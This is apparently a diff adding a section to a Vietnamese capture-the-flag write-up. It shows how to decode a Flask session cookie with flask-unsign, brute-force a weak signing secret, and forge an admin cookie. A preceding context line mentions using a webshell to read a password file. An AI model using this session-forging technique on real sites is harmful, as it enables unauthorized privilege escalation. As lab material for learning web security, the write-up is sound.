@@ -532,3 +532,51 @@ Quay trở lại trình duyệt, chúng ta sẽ thấy các files vừa tải l�
 Thực hiện mở webshell ở một tab mới để thực thi lệnh, chúng ta dùng lệnh `cat ../../../.passwd` để đọc thành công password:
 
 ![image](images/file-upload-mime-type/image-7.png)
+
+## Flask - Unsecure session
+
+> Sign or unsign
+>
+> Flask-me’s web developer tells you that using a strong secret key is useless. Prove him wrong !
+
+![image](images/flask-unsecure-session/image-1.png)
+
+Truy cập vào "ADMIN", chúng ta được thông báo không phải là admin:
+
+![image](images/flask-unsecure-session/image-2.png)
+
+Kiểm tra thấy có một cookie `session`, chúng ta sẽ cần phải khai thác cookie này để trở thành admin:
+
+```text
+eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z7-xXQ.7tUulKii5za8U9DQG0cuvqwlN1A
+```
+
+![image](images/flask-unsecure-session/image-3.png)
+
+Do server sử dụng Flask nên chúng ta sẽ dùng công cụ [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign) để khai thác. Trước tiên, cùng xem nội dung của session, chúng ta thấy `admin` mang giá trị `false`:
+
+```text
+$ flask-unsign -d -c "eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z7-xXQ.7tUulKii5za8U9DQG0cuvqwlN1A"
+{'admin': 'false', 'username': 'guest'}
+```
+
+Chúng ta cần secret để tạo một session mới với giá trị của `admin` là `true`. Tiếp theo, tiến hành brute-force để tìm ra secret `s3cr3t`:
+
+```text
+$ flask-unsign --wordlist ~/wordlists/jwt-secrets.txt --unsign -c "eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z7-xXQ.7tUulKii5za8U9DQG0cuvqwlN1A" --no-literal-eval
+[*] Session decodes to: {'admin': 'false', 'username': 'guest'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 2944 attemptsttyyyyuuuuii
+b's3cr3t'
+```
+
+Đã có được secret, chúng ta sẽ sign một session mới với nội dung `{'admin': 'true', 'username': 'guest'}`:
+
+```text
+$ flask-unsign --sign -c "{'admin': 'true', 'username': 'guest'}" -S s3cr3t
+eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Z7-yIw.8JQHLu-H3ABVht6lAIQzBQKTf08
+```
+
+Thay giá trị của cookie `session` thành chuỗi vừa tạo `eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Z7-yIw.8JQHLu-H3ABVht6lAIQzBQKTf08`, chúng ta reload trang web để thấy flag:
+
+![image](images/flask-unsecure-session/image-4.png)
